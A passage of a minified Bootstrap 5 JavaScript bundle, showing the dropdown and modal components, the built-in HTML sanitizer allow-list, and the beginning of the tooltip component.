            (i._config = i._getConfig(n)),
            (i._menu = i._getMenuElement()),
            (i._inNavbar = i._detectNavbar()),
            i._addEventListeners(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.toggle = function () {
            if (
              !this._element.disabled &&
              !this._element.classList.contains("disabled")
            ) {
              var t = this._element.classList.contains("show");
              o.clearMenus(), t || this.show();
            }
          }),
          (r.show = function () {
            if (
              !(
                this._element.disabled ||
                this._element.classList.contains("disabled") ||
                this._menu.classList.contains("show")
              )
            ) {
              var t = o.getParentFromElement(this._element),
                e = { relatedTarget: this._element };
              if (
                !z.trigger(this._element, "show.bs.dropdown", e)
                  .defaultPrevented
              ) {
                if (this._inNavbar)
                  q.setDataAttribute(this._menu, "popper", "none");
                else {
                  if (void 0 === se)
                    throw new TypeError(
                      "Bootstrap's dropdowns require Popper (https://popper.js.org)"
                    );
                  var n = this._element;
                  "parent" === this._config.reference
                    ? (n = t)
                    : h(this._config.reference)
                    ? ((n = this._config.reference),
                      void 0 !== this._config.reference.jquery &&
                        (n = this._config.reference[0]))
                    : "object" == typeof this._config.reference &&
                      (n = this._config.reference);
                  var i = this._getPopperConfig(),
                    r = i.modifiers.find(function (t) {
                      return "applyStyles" === t.name && !1 === t.enabled;
                    });
                  (this._popper = re(n, this._menu, i)),
                    r && q.setDataAttribute(this._menu, "popper", "static");
                }
                var s;
                "ontouchstart" in document.documentElement &&
                  !t.closest(".navbar-nav") &&
                  (s = []).concat
                    .apply(s, document.body.children)
                    .forEach(function (t) {
                      return z.on(t, "mouseover", null, function () {});
                    }),
                  this._element.focus(),
                  this._element.setAttribute("aria-expanded", !0),
                  this._menu.classList.toggle("show"),
                  this._element.classList.toggle("show"),
                  z.trigger(this._element, "shown.bs.dropdown", e);
              }
            }
          }),
          (r.hide = function () {
            if (
              !this._element.disabled &&
              !this._element.classList.contains("disabled") &&
              this._menu.classList.contains("show")
            ) {
              var t = { relatedTarget: this._element };
              z.trigger(this._element, "hide.bs.dropdown", t)
                .defaultPrevented ||
                (this._popper && this._popper.destroy(),
                this._menu.classList.toggle("show"),
                this._element.classList.toggle("show"),
                q.removeDataAttribute(this._menu, "popper"),
                z.trigger(this._element, "hidden.bs.dropdown", t));
            }
          }),
          (r.dispose = function () {
            t.prototype.dispose.call(this),
              z.off(this._element, ".bs.dropdown"),
              (this._menu = null),
              this._popper && (this._popper.destroy(), (this._popper = null));
          }),
          (r.update = function () {
            (this._inNavbar = this._detectNavbar()),
              this._popper && this._popper.update();
          }),
          (r._addEventListeners = function () {
            var t = this;
            z.on(this._element, "click.bs.dropdown", function (e) {
              e.preventDefault(), e.stopPropagation(), t.toggle();
            });
          }),
          (r._getConfig = function (t) {
            if (
              ((t = n(
                {},
                this.constructor.Default,
                q.getDataAttributes(this._element),
                t
              )),
              p("dropdown", t, this.constructor.DefaultType),
              "object" == typeof t.reference &&
                !h(t.reference) &&
                "function" != typeof t.reference.getBoundingClientRect)
            )
              throw new TypeError(
                "dropdown".toUpperCase() +
                  ': Option "reference" provided type "object" without a required "getBoundingClientRect" method.'
              );
            return t;
          }),
          (r._getMenuElement = function () {
            return (function (t, e) {
              for (var n = t.nextElementSibling; n; ) {
                if (n.matches(".dropdown-menu")) return [n];
                n = n.nextElementSibling;
              }
              return [];
            })(this._element)[0];
          }),
          (r._getPlacement = function () {
            var t = this._element.parentNode;
            if (t.classList.contains("dropend")) return he;
            if (t.classList.contains("dropstart")) return fe;
            var e =
              "end" ===
              getComputedStyle(this._menu)
                .getPropertyValue("--bs-position")
                .trim();
            return t.classList.contains("dropup") ? (e ? ce : le) : e ? de : ue;
          }),
          (r._detectNavbar = function () {
            return null !== this._element.closest(".navbar");
          }),
          (r._getOffset = function () {
            var t = this,
              e = this._config.offset;
            return "string" == typeof e
              ? e.split(",").map(function (t) {
                  return Number.parseInt(t, 10);
                })
              : "function" == typeof e
              ? function (n) {
                  return e(n, t._element);
                }
              : e;
          }),
          (r._getPopperConfig = function () {
            var t = {
              placement: this._getPlacement(),
              modifiers: [
                {
                  name: "preventOverflow",
                  options: {
                    altBoundary: this._config.flip,
                    boundary: this._config.boundary,
                  },
                },
                { name: "offset", options: { offset: this._getOffset() } },
              ],
            };
            return (
              "static" === this._config.display &&
                (t.modifiers = [{ name: "applyStyles", enabled: !1 }]),
              n(
                {},
                t,
                "function" == typeof this._config.popperConfig
                  ? this._config.popperConfig(t)
                  : this._config.popperConfig
              )
            );
          }),
          (o.dropdownInterface = function (t, e) {
            var n = E(t, "bs.dropdown");
            if (
              (n || (n = new o(t, "object" == typeof e ? e : null)),
              "string" == typeof e)
            ) {
              if (void 0 === n[e])
                throw new TypeError('No method named "' + e + '"');
              n[e]();
            }
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              o.dropdownInterface(this, t);
            });
          }),
          (o.clearMenus = function (t) {
            if (
              !t ||
              (2 !== t.button && ("keyup" !== t.type || "Tab" === t.key))
            )
              for (
                var e = F('[data-bs-toggle="dropdown"]'), n = 0, i = e.length;
                n < i;
                n++
              ) {
                var o = E(e[n], "bs.dropdown"),
                  r = { relatedTarget: e[n] };
                if ((t && "click" === t.type && (r.clickEvent = t), o)) {
                  var s,
                    a = o._menu;
                  e[n].classList.contains("show") &&
                    !(
                      (t &&
                        (("click" === t.type &&
                          /input|textarea/i.test(t.target.tagName)) ||
                          ("keyup" === t.type && "Tab" === t.key)) &&
                        a.contains(t.target)) ||
                      z.trigger(e[n], "hide.bs.dropdown", r).defaultPrevented
                    ) &&
                    ("ontouchstart" in document.documentElement &&
                      (s = []).concat
                        .apply(s, document.body.children)
                        .forEach(function (t) {
                          return z.off(t, "mouseover", null, function () {});
                        }),
                    e[n].setAttribute("aria-expanded", "false"),
                    o._popper && o._popper.destroy(),
                    a.classList.remove("show"),
                    e[n].classList.remove("show"),
                    q.removeDataAttribute(a, "popper"),
                    z.trigger(e[n], "hidden.bs.dropdown", r));
                }
              }
          }),
          (o.getParentFromElement = function (t) {
            return c(t) || t.parentNode;
          }),
          (o.dataApiKeydownHandler = function (t) {
            if (
              !(/input|textarea/i.test(t.target.tagName)
                ? "Space" === t.key ||
                  ("Escape" !== t.key &&
                    (("ArrowDown" !== t.key && "ArrowUp" !== t.key) ||
                      t.target.closest(".dropdown-menu")))
                : !ae.test(t.key)) &&
              (t.preventDefault(),
              t.stopPropagation(),
              !this.disabled && !this.classList.contains("disabled"))
            ) {
              var e = o.getParentFromElement(this),
                n = this.classList.contains("show");
              if ("Escape" === t.key)
                return (
                  (this.matches('[data-bs-toggle="dropdown"]')
                    ? this
                    : V(this, '[data-bs-toggle="dropdown"]')[0]
                  ).focus(),
                  void o.clearMenus()
                );
              if (n || ("ArrowUp" !== t.key && "ArrowDown" !== t.key))
                if (n && "Space" !== t.key) {
                  var i = F(
                    ".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)",
                    e
                  ).filter(g);
                  if (i.length) {
                    var r = i.indexOf(t.target);
                    "ArrowUp" === t.key && r > 0 && r--,
                      "ArrowDown" === t.key && r < i.length - 1 && r++,
                      i[(r = -1 === r ? 0 : r)].focus();
                  }
                } else o.clearMenus();
              else
                (this.matches('[data-bs-toggle="dropdown"]')
                  ? this
                  : V(this, '[data-bs-toggle="dropdown"]')[0]
                ).click();
            }
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return pe;
              },
            },
            {
              key: "DefaultType",
              get: function () {
                return ge;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.dropdown";
              },
            },
          ]),
          o
        );
      })(B);
    z.on(
      document,
      "keydown.bs.dropdown.data-api",
      '[data-bs-toggle="dropdown"]',
      me.dataApiKeydownHandler
    ),
      z.on(
        document,
        "keydown.bs.dropdown.data-api",
        ".dropdown-menu",
        me.dataApiKeydownHandler
      ),
      z.on(document, "click.bs.dropdown.data-api", me.clearMenus),
      z.on(document, "keyup.bs.dropdown.data-api", me.clearMenus),
      z.on(
        document,
        "click.bs.dropdown.data-api",
        '[data-bs-toggle="dropdown"]',
        function (t) {
          t.preventDefault(),
            t.stopPropagation(),
            me.dropdownInterface(this, "toggle");
        }
      ),
      z.on(
        document,
        "click.bs.dropdown.data-api",
        ".dropdown form",
        function (t) {
          return t.stopPropagation();
        }
      ),
      _("dropdown", me);
    var ve = { backdrop: !0, keyboard: !0, focus: !0 },
      ye = {
        backdrop: "(boolean|string)",
        keyboard: "boolean",
        focus: "boolean",
      },
      be = (function (t) {
        function o(e, n) {
          var i;
          return (
            ((i = t.call(this, e) || this)._config = i._getConfig(n)),
            (i._dialog = U(".modal-dialog", e)),
            (i._backdrop = null),
            (i._isShown = !1),
            (i._isBodyOverflowing = !1),
            (i._ignoreBackdropClick = !1),
            (i._isTransitioning = !1),
            (i._scrollbarWidth = 0),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.toggle = function (t) {
            return this._isShown ? this.hide() : this.show(t);
          }),
          (r.show = function (t) {
            var e = this;
            if (!this._isShown && !this._isTransitioning) {
              this._element.classList.contains("fade") &&
                (this._isTransitioning = !0);
              var n = z.trigger(this._element, "show.bs.modal", {
                relatedTarget: t,
              });
              this._isShown ||
                n.defaultPrevented ||
                ((this._isShown = !0),
                this._checkScrollbar(),
                this._setScrollbar(),
                this._adjustDialog(),
                this._setEscapeEvent(),
                this._setResizeEvent(),
                z.on(
                  this._element,
                  "click.dismiss.bs.modal",
                  '[data-bs-dismiss="modal"]',
                  function (t) {
                    return e.hide(t);
                  }
                ),
                z.on(this._dialog, "mousedown.dismiss.bs.modal", function () {
                  z.one(e._element, "mouseup.dismiss.bs.modal", function (t) {
                    t.target === e._element && (e._ignoreBackdropClick = !0);
                  });
                }),
                this._showBackdrop(function () {
                  return e._showElement(t);
                }));
            }
          }),
          (r.hide = function (t) {
            var e = this;
            if (
              (t && t.preventDefault(),
              this._isShown &&
                !this._isTransitioning &&
                !z.trigger(this._element, "hide.bs.modal").defaultPrevented)
            ) {
              this._isShown = !1;
              var n = this._element.classList.contains("fade");
              if (
                (n && (this._isTransitioning = !0),
                this._setEscapeEvent(),
                this._setResizeEvent(),
                z.off(document, "focusin.bs.modal"),
                this._element.classList.remove("show"),
                z.off(this._element, "click.dismiss.bs.modal"),
                z.off(this._dialog, "mousedown.dismiss.bs.modal"),
                n)
              ) {
                var i = u(this._element);
                z.one(this._element, "transitionend", function (t) {
                  return e._hideModal(t);
                }),
                  f(this._element, i);
              } else this._hideModal();
            }
          }),
          (r.dispose = function () {
            [window, this._element, this._dialog].forEach(function (t) {
              return z.off(t, ".bs.modal");
            }),
              t.prototype.dispose.call(this),
              z.off(document, "focusin.bs.modal"),
              (this._config = null),
              (this._dialog = null),
              (this._backdrop = null),
              (this._isShown = null),
              (this._isBodyOverflowing = null),
              (this._ignoreBackdropClick = null),
              (this._isTransitioning = null),
              (this._scrollbarWidth = null);
          }),
          (r.handleUpdate = function () {
            this._adjustDialog();
          }),
          (r._getConfig = function (t) {
            return (t = n({}, ve, t)), p("modal", t, ye), t;
          }),
          (r._showElement = function (t) {
            var e = this,
              n = this._element.classList.contains("fade"),
              i = U(".modal-body", this._dialog);
            (this._element.parentNode &&
              this._element.parentNode.nodeType === Node.ELEMENT_NODE) ||
              document.body.appendChild(this._element),
              (this._element.style.display = "block"),
              this._element.removeAttribute("aria-hidden"),
              this._element.setAttribute("aria-modal", !0),
              this._element.setAttribute("role", "dialog"),
              (this._element.scrollTop = 0),
              i && (i.scrollTop = 0),
              n && v(this._element),
              this._element.classList.add("show"),
              this._config.focus && this._enforceFocus();
            var o = function () {
              e._config.focus && e._element.focus(),
                (e._isTransitioning = !1),
                z.trigger(e._element, "shown.bs.modal", { relatedTarget: t });
            };
            if (n) {
              var r = u(this._dialog);
              z.one(this._dialog, "transitionend", o), f(this._dialog, r);
            } else o();
          }),
          (r._enforceFocus = function () {
            var t = this;
            z.off(document, "focusin.bs.modal"),
              z.on(document, "focusin.bs.modal", function (e) {
                document === e.target ||
                  t._element === e.target ||
                  t._element.contains(e.target) ||
                  t._element.focus();
              });
          }),
          (r._setEscapeEvent = function () {
            var t = this;
            this._isShown
              ? z.on(this._element, "keydown.dismiss.bs.modal", function (e) {
                  t._config.keyboard && "Escape" === e.key
                    ? (e.preventDefault(), t.hide())
                    : t._config.keyboard ||
                      "Escape" !== e.key ||
                      t._triggerBackdropTransition();
                })
              : z.off(this._element, "keydown.dismiss.bs.modal");
          }),
          (r._setResizeEvent = function () {
            var t = this;
            this._isShown
              ? z.on(window, "resize.bs.modal", function () {
                  return t._adjustDialog();
                })
              : z.off(window, "resize.bs.modal");
          }),
          (r._hideModal = function () {
            var t = this;
            (this._element.style.display = "none"),
              this._element.setAttribute("aria-hidden", !0),
              this._element.removeAttribute("aria-modal"),
              this._element.removeAttribute("role"),
              (this._isTransitioning = !1),
              this._showBackdrop(function () {
                document.body.classList.remove("modal-open"),
                  t._resetAdjustments(),
                  t._resetScrollbar(),
                  z.trigger(t._element, "hidden.bs.modal");
              });
          }),
          (r._removeBackdrop = function () {
            this._backdrop.parentNode.removeChild(this._backdrop),
              (this._backdrop = null);
          }),
          (r._showBackdrop = function (t) {
            var e = this,
              n = this._element.classList.contains("fade") ? "fade" : "";
            if (this._isShown && this._config.backdrop) {
              if (
                ((this._backdrop = document.createElement("div")),
                (this._backdrop.className = "modal-backdrop"),
                n && this._backdrop.classList.add(n),
                document.body.appendChild(this._backdrop),
                z.on(this._element, "click.dismiss.bs.modal", function (t) {
                  e._ignoreBackdropClick
                    ? (e._ignoreBackdropClick = !1)
                    : t.target === t.currentTarget &&
                      ("static" === e._config.backdrop
                        ? e._triggerBackdropTransition()
                        : e.hide());
                }),
                n && v(this._backdrop),
                this._backdrop.classList.add("show"),
                !n)
              )
                return void t();
              var i = u(this._backdrop);
              z.one(this._backdrop, "transitionend", t), f(this._backdrop, i);
            } else if (!this._isShown && this._backdrop) {
              this._backdrop.classList.remove("show");
              var o = function () {
                e._removeBackdrop(), t();
              };
              if (this._element.classList.contains("fade")) {
                var r = u(this._backdrop);
                z.one(this._backdrop, "transitionend", o), f(this._backdrop, r);
              } else o();
            } else t();
          }),
          (r._triggerBackdropTransition = function () {
            var t = this;
            if (
              !z.trigger(this._element, "hidePrevented.bs.modal")
                .defaultPrevented
            ) {
              var e =
                this._element.scrollHeight >
                document.documentElement.clientHeight;
              e || (this._element.style.overflowY = "hidden"),
                this._element.classList.add("modal-static");
              var n = u(this._dialog);
              z.off(this._element, "transitionend"),
                z.one(this._element, "transitionend", function () {
                  t._element.classList.remove("modal-static"),
                    e ||
                      (z.one(t._element, "transitionend", function () {
                        t._element.style.overflowY = "";
                      }),
                      f(t._element, n));
                }),
                f(this._element, n),
                this._element.focus();
            }
          }),
          (r._adjustDialog = function () {
            var t =
              this._element.scrollHeight >
              document.documentElement.clientHeight;
            ((!this._isBodyOverflowing && t && !b) ||
              (this._isBodyOverflowing && !t && b)) &&
              (this._element.style.paddingLeft = this._scrollbarWidth + "px"),
              ((this._isBodyOverflowing && !t && !b) ||
                (!this._isBodyOverflowing && t && b)) &&
                (this._element.style.paddingRight =
                  this._scrollbarWidth + "px");
          }),
          (r._resetAdjustments = function () {
            (this._element.style.paddingLeft = ""),
              (this._element.style.paddingRight = "");
          }),
          (r._checkScrollbar = function () {
            var t = document.body.getBoundingClientRect();
            (this._isBodyOverflowing =
              Math.round(t.left + t.right) < window.innerWidth),
              (this._scrollbarWidth = this._getScrollbarWidth());
          }),
          (r._setScrollbar = function () {
            var t = this;
            this._isBodyOverflowing &&
              (this._setElementAttributes(
                ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
                "paddingRight",
                function (e) {
                  return e + t._scrollbarWidth;
                }
              ),
              this._setElementAttributes(
                ".sticky-top",
                "marginRight",
                function (e) {
                  return e - t._scrollbarWidth;
                }
              ),
              this._setElementAttributes("body", "paddingRight", function (e) {
                return e + t._scrollbarWidth;
              })),
              document.body.classList.add("modal-open");
          }),
          (r._setElementAttributes = function (t, e, n) {
            F(t).forEach(function (t) {
              var i = t.style[e],
                o = window.getComputedStyle(t)[e];
              q.setDataAttribute(t, e, i),
                (t.style[e] = n(Number.parseFloat(o)) + "px");
            });
          }),
          (r._resetScrollbar = function () {
            this._resetElementAttributes(
              ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
              "paddingRight"
            ),
              this._resetElementAttributes(".sticky-top", "marginRight"),
              this._resetElementAttributes("body", "paddingRight");
          }),
          (r._resetElementAttributes = function (t, e) {
            F(t).forEach(function (t) {
              var n = q.getDataAttribute(t, e);
              void 0 === n && t === document.body
                ? (t.style[e] = "")
                : (q.removeDataAttribute(t, e), (t.style[e] = n));
            });
          }),
          (r._getScrollbarWidth = function () {
            var t = document.createElement("div");
            (t.className = "modal-scrollbar-measure"),
              document.body.appendChild(t);
            var e = t.getBoundingClientRect().width - t.clientWidth;
            return document.body.removeChild(t), e;
          }),
          (o.jQueryInterface = function (t, e) {
            return this.each(function () {
              var i = E(this, "bs.modal"),
                r = n(
                  {},
                  ve,
                  q.getDataAttributes(this),
                  "object" == typeof t && t ? t : {}
                );
              if ((i || (i = new o(this, r)), "string" == typeof t)) {
                if (void 0 === i[t])
                  throw new TypeError('No method named "' + t + '"');
                i[t](e);
              }
            });
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return ve;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.modal";
              },
            },
          ]),
          o
        );
      })(B);
    z.on(
      document,
      "click.bs.modal.data-api",
      '[data-bs-toggle="modal"]',
      function (t) {
        var e = this,
          i = c(this);
        ("A" !== this.tagName && "AREA" !== this.tagName) || t.preventDefault(),
          z.one(i, "show.bs.modal", function (t) {
            t.defaultPrevented ||
              z.one(i, "hidden.bs.modal", function () {
                g(e) && e.focus();
              });
          });
        var o = E(i, "bs.modal");
        if (!o) {
          var r = n({}, q.getDataAttributes(i), q.getDataAttributes(this));
          o = new be(i, r);
        }
        o.toggle(this);
      }
    ),
      _("modal", be);
    var _e = new Set([
        "background",
        "cite",
        "href",
        "itemtype",
        "longdesc",
        "poster",
        "src",
        "xlink:href",
      ]),
      we = /^(?:(?:https?|mailto|ftp|tel|file):|[^#&/:?]*(?:[#/?]|$))/gi,
      xe =
        /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[\d+/a-z]+=*$/i;
    function Ee(t, e, n) {
      var i;
      if (!t.length) return t;
      if (n && "function" == typeof n) return n(t);
      for (
        var o = new window.DOMParser().parseFromString(t, "text/html"),
          r = Object.keys(e),
          s = (i = []).concat.apply(i, o.body.querySelectorAll("*")),
          a = function (t, n) {
            var i,
              o = s[t],
              a = o.nodeName.toLowerCase();
            if (!r.includes(a)) return o.parentNode.removeChild(o), "continue";
            var l = (i = []).concat.apply(i, o.attributes),
              c = [].concat(e["*"] || [], e[a] || []);
            l.forEach(function (t) {
              (function (t, e) {
                var n = t.nodeName.toLowerCase();
                if (e.includes(n))
                  return (
                    !_e.has(n) ||
                    Boolean(we.test(t.nodeValue) || xe.test(t.nodeValue))
                  );
                for (
                  var i = e.filter(function (t) {
                      return t instanceof RegExp;
                    }),
                    o = 0,
                    r = i.length;
                  o < r;
                  o++
                )
                  if (i[o].test(n)) return !0;
                return !1;
              })(t, c) || o.removeAttribute(t.nodeName);
            });
          },
          l = 0,
          c = s.length;
        l < c;
        l++
      )
        a(l);
      return o.body.innerHTML;
    }
    var Te = new RegExp("(^|\\s)bs-tooltip\\S+", "g"),
      Ce = new Set(["sanitize", "allowList", "sanitizeFn"]),
      Ae = {
        animation: "boolean",
        template: "string",
        title: "(string|element|function)",
        trigger: "string",
        delay: "(number|object)",
        html: "boolean",
        selector: "(string|boolean)",
        placement: "(string|function)",
        offset: "(array|string|function)",
        container: "(string|element|boolean)",
        fallbackPlacements: "array",
        boundary: "(string|element)",
        customClass: "(string|function)",
        sanitize: "boolean",
        sanitizeFn: "(null|function)",
        allowList: "object",
        popperConfig: "(null|object|function)",
      },
      ke = {
        AUTO: "auto",
        TOP: "top",
        RIGHT: b ? "left" : "right",
        BOTTOM: "bottom",
        LEFT: b ? "right" : "left",
      },
      Se = {
        animation: !0,
        template:
          '<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',
        trigger: "hover focus",
        title: "",
        delay: 0,
        html: !1,
        selector: !1,
        placement: "top",
        offset: [0, 0],
        container: !1,
        fallbackPlacements: ["top", "right", "bottom", "left"],
        boundary: "clippingParents",
        customClass: "",
        sanitize: !0,
        sanitizeFn: null,
        allowList: {
          "*": ["class", "dir", "id", "lang", "role", /^aria-[\w-]*$/i],
          a: ["target", "href", "title", "rel"],
          area: [],
          b: [],
          br: [],
          col: [],
          code: [],
          div: [],
          em: [],
          hr: [],
          h1: [],
          h2: [],
          h3: [],
          h4: [],
          h5: [],
          h6: [],
          i: [],
          img: ["src", "srcset", "alt", "title", "width", "height"],
          li: [],
          ol: [],
          p: [],
          pre: [],
          s: [],
          small: [],
          span: [],
          sub: [],
          sup: [],
          strong: [],
          u: [],
          ul: [],
        },
        popperConfig: null,
      },
      Le = {
        HIDE: "hide.bs.tooltip",
        HIDDEN: "hidden.bs.tooltip",
        SHOW: "show.bs.tooltip",
        SHOWN: "shown.bs.tooltip",
        INSERTED: "inserted.bs.tooltip",
        CLICK: "click.bs.tooltip",
        FOCUSIN: "focusin.bs.tooltip",
        FOCUSOUT: "focusout.bs.tooltip",
        MOUSEENTER: "mouseenter.bs.tooltip",
        MOUSELEAVE: "mouseleave.bs.tooltip",
      },
      De = (function (t) {
        function o(e, n) {
          var i;
          if (void 0 === se)
            throw new TypeError(
              "Bootstrap's tooltips require Popper (https://popper.js.org)"
            );
          return (
            ((i = t.call(this, e) || this)._isEnabled = !0),
            (i._timeout = 0),
            (i._hoverState = ""),
            (i._activeTrigger = {}),
            (i._popper = null),
            (i.config = i._getConfig(n)),
            (i.tip = null),
            i._setListeners(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.enable = function () {
            this._isEnabled = !0;
          }),
          (r.disable = function () {
            this._isEnabled = !1;
          }),
          (r.toggleEnabled = function () {
            this._isEnabled = !this._isEnabled;
          }),
          (r.toggle = function (t) {
            if (this._isEnabled)
              if (t) {
                var e = this._initializeOnDelegatedTarget(t);
                (e._activeTrigger.click = !e._activeTrigger.click),
                  e._isWithActiveTrigger()
                    ? e._enter(null, e)
                    : e._leave(null, e);
              } else {
                if (this.getTipElement().classList.contains("show"))
                  return void this._leave(null, this);
                this._enter(null, this);
              }
          }),
          (r.dispose = function () {
            clearTimeout(this._timeout),
              z.off(this._element, this.constructor.EVENT_KEY),
              z.off(
                this._element.closest(".modal"),
                "hide.bs.modal",
                this._hideModalHandler
              ),
              this.tip &&
                this.tip.parentNode &&
                this.tip.parentNode.removeChild(this.tip),
              (this._isEnabled = null),
              (this._timeout = null),
              (this._hoverState = null),
              (this._activeTrigger = null),
              this._popper && this._popper.destroy(),
              (this._popper = null),
              (this.config = null),
              (this.tip = null),
              t.prototype.dispose.call(this);
          }),
          (r.show = function () {
            var t = this;
            if ("none" === this._element.style.display)
              throw new Error("Please use show on visible elements");
            if (this.isWithContent() && this._isEnabled) {
              var e = z.trigger(this._element, this.constructor.Event.SHOW),
                n = (function t(e) {
                  if (!document.documentElement.attachShadow) return null;
                  if ("function" == typeof e.getRootNode) {
                    var n = e.getRootNode();
                    return n instanceof ShadowRoot ? n : null;
                  }
                  return e instanceof ShadowRoot
                    ? e
                    : e.parentNode
                    ? t(e.parentNode)
                    : null;
                })(this._element),
                i =
                  null === n
                    ? this._element.ownerDocument.documentElement.contains(
                        this._element
                      )
                    : n.contains(this._element);
              if (!e.defaultPrevented && i) {
                var o = this.getTipElement(),
                  r = s(this.constructor.NAME);
                o.setAttribute("id", r),
                  this._element.setAttribute("aria-describedby", r),
                  this.setContent(),
                  this.config.animation && o.classList.add("fade");
                var a =
                    "function" == typeof this.config.placement
                      ? this.config.placement.call(this, o, this._element)
                      : this.config.placement,
                  l = this._getAttachment(a);
                this._addAttachmentClass(l);
                var c = this._getContainer();
                x(o, this.constructor.DATA_KEY, this),
                  this._element.ownerDocument.documentElement.contains(
                    this.tip
                  ) || c.appendChild(o),
                  z.trigger(this._element, this.constructor.Event.INSERTED),
                  (this._popper = re(
                    this._element,
                    o,
                    this._getPopperConfig(l)
                  )),
                  o.classList.add("show");
                var d,
                  h,
                  p =
                    "function" == typeof this.config.customClass
                      ? this.config.customClass()
                      : this.config.customClass;
                p && (d = o.classList).add.apply(d, p.split(" ")),
                  "ontouchstart" in document.documentElement &&
                    (h = []).concat
                      .apply(h, document.body.children)
                      .forEach(function (t) {
                        z.on(t, "mouseover", function () {});
                      });
                var g = function () {
                  var e = t._hoverState;
                  (t._hoverState = null),
                    z.trigger(t._element, t.constructor.Event.SHOWN),
                    "out" === e && t._leave(null, t);
                };
                if (this.tip.classList.contains("fade")) {
                  var m = u(this.tip);
                  z.one(this.tip, "transitionend", g), f(this.tip, m);
                } else g();
              }
            }
          }),
          (r.hide = function () {
            var t = this;
            if (this._popper) {
              var e = this.getTipElement(),
                n = function () {
                  "show" !== t._hoverState &&
                    e.parentNode &&
                    e.parentNode.removeChild(e),
                    t._cleanTipClass(),
                    t._element.removeAttribute("aria-describedby"),
                    z.trigger(t._element, t.constructor.Event.HIDDEN),
                    t._popper && (t._popper.destroy(), (t._popper = null));
                };
              if (
                !z.trigger(this._element, this.constructor.Event.HIDE)
                  .defaultPrevented
              ) {
                var i;
                if (
                  (e.classList.remove("show"),
                  "ontouchstart" in document.documentElement &&
                    (i = []).concat
                      .apply(i, document.body.children)
                      .forEach(function (t) {
                        return z.off(t, "mouseover", m);
                      }),
                  (this._activeTrigger.click = !1),
                  (this._activeTrigger.focus = !1),
                  (this._activeTrigger.hover = !1),
                  this.tip.classList.contains("fade"))
                ) {
                  var o = u(e);
                  z.one(e, "transitionend", n), f(e, o);
                } else n();
                this._hoverState = "";
              }
            }
          }),
          (r.update = function () {
            null !== this._popper && this._popper.update();
          }),
          (r.isWithContent = function () {
            return Boolean(this.getTitle());
          }),
          (r.getTipElement = function () {
            if (this.tip) return this.tip;
            var t = document.createElement("div");
            return (
              (t.innerHTML = this.config.template),
              (this.tip = t.children[0]),
              this.tip
            );
          }),
          (r.setContent = function () {
            var t = this.getTipElement();
            this.setElementContent(U(".tooltip-inner", t), this.getTitle()),
              t.classList.remove("fade", "show");
          }),
          (r.setElementContent = function (t, e) {
            if (null !== t)
              return "object" == typeof e && h(e)
                ? (e.jquery && (e = e[0]),
                  void (this.config.html
                    ? e.parentNode !== t &&
                      ((t.innerHTML = ""), t.appendChild(e))
                    : (t.textContent = e.textContent)))
                : void (this.config.html
                    ? (this.config.sanitize &&
                        (e = Ee(
                          e,
                          this.config.allowList,
                          this.config.sanitizeFn
                        )),
                      (t.innerHTML = e))
                    : (t.textContent = e));
          }),
          (r.getTitle = function () {
            var t = this._element.getAttribute("data-bs-original-title");
            return (
              t ||
                (t =
                  "function" == typeof this.config.title
                    ? this.config.title.call(this._element)
                    : this.config.title),
              t
            );
          }),
          (r.updateAttachment = function (t) {
            return "right" === t ? "end" : "left" === t ? "start" : t;
          }),
          (r._initializeOnDelegatedTarget = function (t, e) {
            var n = this.constructor.DATA_KEY;
            return (
              (e = e || E(t.delegateTarget, n)) ||
                ((e = new this.constructor(
                  t.delegateTarget,
                  this._getDelegateConfig()
                )),
                x(t.delegateTarget, n, e)),
              e
            );
          }),
          (r._getOffset = function () {
            var t = this,
              e = this.config.offset;
            return "string" == typeof e
              ? e.split(",").map(function (t) {
                  return Number.parseInt(t, 10);
                })
              : "function" == typeof e
              ? function (n) {
                  return e(n, t._element);
                }
              : e;
          }),
          (r._getPopperConfig = function (t) {
            var e = this,
              i = {
                placement: t,
                modifiers: [
                  {
                    name: "flip",
                    options: {
                      altBoundary: !0,
                      fallbackPlacements: this.config.fallbackPlacements,
                    },
                  },
                  { name: "offset", options: { offset: this._getOffset() } },
                  {
                    name: "preventOverflow",
                    options: { boundary: this.config.boundary },
                  },
                  {
                    name: "arrow",
                    options: {
                      element: "." + this.constructor.NAME + "-arrow",
                    },
                  },
                  {
                    name: "onChange",
                    enabled: !0,
                    phase: "afterWrite",
                    fn: function (t) {
                      return e._handlePopperPlacementChange(t);
                    },
                  },
                ],
                onFirstUpdate: function (t) {
                  t.options.placement !== t.placement &&
                    e._handlePopperPlacementChange(t);
                },
              };
            return n(
              {},
              i,
              "function" == typeof this.config.popperConfig
                ? this.config.popperConfig(i)
                : this.config.popperConfig
            );
          }),
          (r._addAttachmentClass = function (t) {
            this.getTipElement().classList.add(
              "bs-tooltip-" + this.updateAttachment(t)
            );
          }),
          (r._getContainer = function () {
            return !1 === this.config.container
              ? document.body
              : h(this.config.container)
              ? this.config.container
              : U(this.config.container);
          }),
          (r._getAttachment = function (t) {
            return ke[t.toUpperCase()];
          }),
          (r._setListeners = function () {
            var t = this;
            this.config.trigger.split(" ").forEach(function (e) {
              if ("click" === e)
                z.on(
                  t._element,
                  t.constructor.Event.CLICK,
                  t.config.selector,
                  function (e) {
                    return t.toggle(e);
                  }
                );
              else if ("manual" !== e) {
                var n =
                    "hover" === e
                      ? t.constructor.Event.MOUSEENTER
                      : t.constructor.Event.FOCUSIN,
                  i =
                    "hover" === e
                      ? t.constructor.Event.MOUSELEAVE
                      : t.constructor.Event.FOCUSOUT;
                z.on(t._element, n, t.config.selector, function (e) {
                  return t._enter(e);
                }),
                  z.on(t._element, i, t.config.selector, function (e) {
                    return t._leave(e);
                  });
              }
            }),
